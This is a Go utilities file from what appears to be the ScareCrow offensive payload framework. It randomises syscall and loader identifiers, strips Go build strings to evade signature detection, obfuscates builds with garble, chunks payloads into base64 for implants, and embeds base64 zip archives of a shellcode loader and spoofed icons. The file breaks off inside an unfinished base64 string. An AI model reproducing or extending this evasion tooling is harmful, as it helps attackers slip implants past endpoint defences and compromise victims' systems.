package Utils

import (
	"ScareCrow/Cryptor"
	"archive/zip"
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

const garblePackage string = "mvdan.cc/garble@latest"

func Version() {
	Version := runtime.Version()
	Version = strings.Replace(Version, "go1.", "", -1)
	VerNumb, _ := strconv.ParseFloat(Version, 64)
	if VerNumb >= 19.1 {
	} else {
		log.Fatal("Error: The version of Go is to old, please update to version 1.19.1 or later")
	}
}

func ModuleObfuscator(name string, FuncName string, encryptionmode string) {
	NTVirProt := Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	NTVirProtpre := Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	Alloc := Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	NtOpenSectionprep := Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	NtOpenSection := Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	NtProtectVirtualMemoryJMPprep := Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)

	sysid := Cryptor.VarNumberLength(10, 19)
	processHandle := Cryptor.VarNumberLength(10, 19)
	baseAddress := Cryptor.VarNumberLength(10, 19)
	regionSize := Cryptor.VarNumberLength(10, 19)
	NewProtect := Cryptor.VarNumberLength(10, 19)
	oldprotect := Cryptor.VarNumberLength(10, 19)
	loader := Cryptor.VarNumberLength(10, 19)

	syscallA := Cryptor.VarNumberLength(10, 19)
	KnownDll := Cryptor.VarNumberLength(10, 19)
	ttttt := Cryptor.VarNumberLength(10, 19)
	objectAttributes := Cryptor.VarNumberLength(10, 19)

	name = name + ".go"
	if encryptionmode == "ELZMA" {
		PackageEditor("loader/loader.go", "[io_import]", `"io"`)
		PackageEditor("loader/loader.go", "[bytes_import]", `"bytes"`)
		PackageEditor("loader/loader.go", "[log_import]", `"log"`)
		PackageEditor("loader/loader.go", "[ELZMA]", `"github.com/ulikunitz/xz"`)
		PackageEditor("loader/loader.go", "[cipher_import]", ``)
		PackageEditor("loader/loader.go", "[aes_import]", ``)
	}
	if encryptionmode == "AES" {
		PackageEditor("loader/loader.go", "[cipher_import]", `"crypto/cipher"`)
		PackageEditor("loader/loader.go", "[aes_import]", `"crypto/aes"`)
		PackageEditor("loader/loader.go", "[io_import]", ``)
		PackageEditor("loader/loader.go", "[bytes_import]", ``)
		PackageEditor("loader/loader.go", "[log_import]", ``)
		PackageEditor("loader/loader.go", "[ELZMA]", ``)
	}
	if encryptionmode == "RC4" {
		PackageEditor("loader/loader.go", "[cipher_import]", `"crypto/rc4"`)
		PackageEditor("loader/loader.go", "[aes_import]", ``)
		PackageEditor("loader/loader.go", "[io_import]", ``)
		PackageEditor("loader/loader.go", "[bytes_import]", ``)
		PackageEditor("loader/loader.go", "[log_import]", ``)
		PackageEditor("loader/loader.go", "[ELZMA]", ``)
	}

	PackageEditor("loader/loader.go", "[NtProtectVirtualMemoryprep]", NTVirProtpre)
	PackageEditor("loader/loader.go", "[NtProtectVirtualMemoryJMPprep]", NtProtectVirtualMemoryJMPprep)
	PackageEditor("loader/loader.go", "NtProtectVirtualMemory", NTVirProt)
	PackageEditor("loader/loader.go", "Allocate", Alloc)
	PackageEditor("loader/loader.go", "[NtOpenSectionprep]", NtOpenSectionprep)
	PackageEditor("loader/loader.go", "NtOpenSection", NtOpenSection)

	PackageEditor("loader/loader.go", "loader", loader)
	PackageEditor("loader/loader.go", "FuncName", FuncName)

	PackageEditor("loader/loader.go", "[sysid]", sysid)
	PackageEditor("loader/loader.go", "[processHandle]", processHandle)
	PackageEditor("loader/loader.go", "[baseAddress]", baseAddress)
	PackageEditor("loader/loader.go", "[regionSize]", regionSize)
	PackageEditor("loader/loader.go", "[NewProtect]", NewProtect)
	PackageEditor("loader/loader.go", "[oldprotect]", oldprotect)
	PackageEditor("loader/loader.go", "[syscallA]", syscallA)
	PackageEditor("loader/loader.go", "[KnownDll]", KnownDll)
	PackageEditor("loader/loader.go", "[ttttt]", ttttt)
	PackageEditor("loader/loader.go", "[objectAttributes]", objectAttributes)

	PackageEditor("loader/asm.s", "NtProtectVirtualMemory", NTVirProt)
	PackageEditor("loader/asm.s", "Allocate", Alloc)
	PackageEditor("loader/asm.s", "NtOpenSection", NtOpenSection)
	PackageEditor(name, "[loader]", loader)
	PackageEditor(name, "[NtProtectVirtualMemory]", NTVirProt)
	PackageEditor(name, "[Allocate]", Alloc)
	PackageEditor(name, "[NtProtectVirtualMemoryJMPprep]", NtProtectVirtualMemoryJMPprep)
	PackageEditor(name, "[NtProtectVirtualMemoryprep]", NTVirProtpre)
	PackageEditor(name, "[NtOpenSection]", NtOpenSection)
	PackageEditor(name, "[NtOpenSectionprep]", NtOpenSectionprep)

	PackageEditor("go.mod", "loader", loader)
	os.Rename("loader/loader.go", "loader/"+loader+".go")
	os.Rename("loader", loader)
}

func PackageEditor(file, orginalstring, replacestring string) {
	input, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	output := bytes.Replace(input, []byte(orginalstring), []byte(replacestring), -1)

	if err = ioutil.WriteFile(file, output, 0666); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func CheckGarble() {
	bin, _ := exec.LookPath("env")
	var cmd *exec.Cmd
	cwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}
	garble := "garble"
	if runtime.GOOS == "windows" {
		garble = garble + ".exe"
	}

	if _, err := os.Stat(filepath.Join(cwd, ".lib", garble)); err == nil {
		fmt.Println("[+] Garble is present")
	} else {
		fmt.Println("[!] Missing Garble... Downloading it now")

		switch runtime.GOOS {
		case "windows":
			pre_code := `
$env:GOBINB=$GOBIN;
$env:GOBIN="%s";

%s

$env:GOBIN=$GOBINB;
$env:GOBINB=$null
			`
			cmd_code := fmt.Sprintf("go install %s", garblePackage)
			code := fmt.Sprintf(pre_code, filepath.Join(cwd, ".lib"), cmd_code)
			fmt.Printf("[+] Executed code:\n%s\n", code)

			opt := strings.Join([]string{"-NonInteractive"}, " ")
			cmd = exec.Command("powershell.exe", opt, code)
		default:
			cmd = exec.Command(bin, "GOBIN="+filepath.Join(cwd, ".lib"), "go", "install", garblePackage)
		}

		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		err := cmd.Run()
		if err != nil {
			fmt.Printf("%s: %s\n", err, stderr.String())
		}
		fmt.Println(out.String(), stderr.String())
	}
}



func GoEditor(name string) {
	buff, err := ioutil.ReadFile(name)
	if err != nil {
		log.Fatalf("Error: %s", err)
	}
	gostringg1 := "to unallocated span37252902984619140625Arabic Standard TimeAzores Standard"
	gostringg2 := "TimeCertFindChainInStoreCertOpenSystemStoreWChangeServiceConfigWCheckTokenMembershipCreateProcessAsUserWCryptAcquireContextWEgyptian_HieroglyphsEtwReplyNotificationGetAcceptExSockaddrsGetAdaptersAddressesGetCurrentDirectoryWGetFileAttributesExWGetModuleInformationGetProcessMemoryInfoGetWindowsDirectoryWIDS_Trinary_OperatorIsrael Standard TimeJordan Standard TimeMeroitic_Hieroglyphs"
	gostringg3 := "Standard Timebad defer size classbad font file formatbad system page sizebad use of bucket.bpbad use of bucket.mpchan send (nil chan)close of nil channelconnection timed outdodeltimer0: wrong Pfloating point errorforcegc: phase errorgo of nil func valuegopark: bad g statusinconsistent lockedminvalid request"
	gostringg4 := "codeinvalid write resultis a named type filekey has been revokedmalloc during signalnotetsleep not on g0p mcache not flushedpacer: assist ratio=preempt off reason: reflect.Value.SetIntreflect.makeFuncStubruntime: double waitruntime: unknown pc semaRoot rotateRighttime: invalid numbertrace: out of memorywirep: already in goworkbuf is not emptywrite of Go pointer ws2_32.dll not foundzlib: invalid header of unexported method previous allocCount=, levelBits[level] = 186264514923095703125931322574615478515625AdjustTokenPrivilegesAlaskan Standard TimeAnatolian_HieroglyphsArabian Standard TimeBelarus Standard TimeCentral Standard TimeChangeServiceConfig2WDeregisterEventSourceEastern Standard"
	gostringg5 := "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memory"
	gostringg6 := "buildinf:"
	gostringg7 := " Go build ID:"
	gostringg8 := "gogo"
	gostringg9 := "goid"
	gostringg10 := "go.buildid"
	gostringg11 := "_cgo_dummy_export"
	gostringg12 := "glob"
	gostringg13 := "fatal error: cgo callback before cgo cal"
	stringnum := []string{gostringg1, gostringg2, gostringg3, gostringg4, gostringg5, gostringg6, gostringg7, gostringg8, gostringg9, gostringg10, gostringg11, gostringg12, gostringg13}

	mydata := string(buff)
	for i := range stringnum {
		val := Cryptor.RandStringBytes(len(stringnum[i]))
		mydata = strings.ReplaceAll(string(mydata), stringnum[i], val)
	}

	ioutil.WriteFile(name, []byte(mydata), 0777)

}

func Sha256(input string) {
	f, err := os.Open(input)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		log.Fatal(err)
	}

	fmt.Printf("[!] Sha256 hash of "+input+": %x\n", h.Sum(nil))
}

func Writefile(outFile string, result string) {
	cf, err := os.OpenFile(outFile, os.O_CREATE|os.O_WRONLY, 0644)
	check(err)
	defer cf.Close()
	_, err = cf.Write([]byte(result))
	check(err)
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func StringEncode(b64 string, number int) string {
	var encoded string
	encoded = base64.StdEncoding.EncodeToString([]byte(b64))
	sum := 1
	for i := 1; i < number; i++ {
		encoded = base64.StdEncoding.EncodeToString([]byte(encoded))
		sum += i
	}
	return encoded
}

func B64ripper(B64string string, B64Varible string, implant bool) string {
	var B64payload []string
	MAX_LENGTH := Cryptor.GenerateNumer(400, 850)
	x := 0
	B64length := len(B64string)
	if implant == true {
		B64payload = append(B64payload, fmt.Sprintf("var "+B64Varible+" string\n"))
		for x < B64length {
			if x+MAX_LENGTH <= B64length {
				B64payload = append(B64payload, fmt.Sprintf("		"+B64Varible+" = "+B64Varible+" + \"%s\"\n", B64string[0+x:x+MAX_LENGTH]))

				x += MAX_LENGTH
			} else {
				finalLength := B64length - x
				B64payload = append(B64payload, fmt.Sprintf("		"+B64Varible+" = "+B64Varible+" + \"%s\"\n", B64string[0+x:x+finalLength]))
				x += finalLength
			}
		}
	} else {
		B64payload = append(B64payload, fmt.Sprintf("var "+B64Varible+"=\"\";\n"))
		for x < B64length {
			if x+MAX_LENGTH <= B64length {
				B64payload = append(B64payload, fmt.Sprintf("		"+B64Varible+" = "+B64Varible+" + \"%s\";\n", B64string[0+x:x+MAX_LENGTH]))

				x += MAX_LENGTH
			} else {
				finalLength := B64length - x
				B64payload = append(B64payload, fmt.Sprintf("		"+B64Varible+" = "+B64Varible+" + \"%s\";\n", B64string[0+x:x+finalLength]))
				x += finalLength
			}
		}

	}
	finalstring := strings.Join(B64payload, "")
	return finalstring
}

func Unzip(src string, dest string) ([]string, error) {
	var filenames []string
	r, err := zip.OpenReader(src)
	if err != nil {
		return filenames, err
	}
	defer r.Close()
	for _, f := range r.File {
		fpath := filepath.Join(dest, f.Name)
		if !strings.HasPrefix(fpath, filepath.Clean(dest)+string(os.PathSeparator)) {
			return filenames, fmt.Errorf("%s: illegal file path", fpath)
		}
		filenames = append(filenames, fpath)
		if f.FileInfo().IsDir() {
			os.MkdirAll(fpath, os.ModePerm)
			continue
		}
		if err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
			return filenames, err
		}
		outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err != nil {
			return filenames, err
		}
		rc, err := f.Open()
		if err != nil {
			return filenames, err
		}
		_, err = io.Copy(outFile, rc)
		outFile.Close()
		rc.Close()

		if err != nil {
			return filenames, err
		}
	}
	return filenames, nil
}

func B64decode(name string) {
	var base64string string
	if name == "loader.zip" {
		base64string = "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"
	}
	if name == "icons.zip" {
		base64string = "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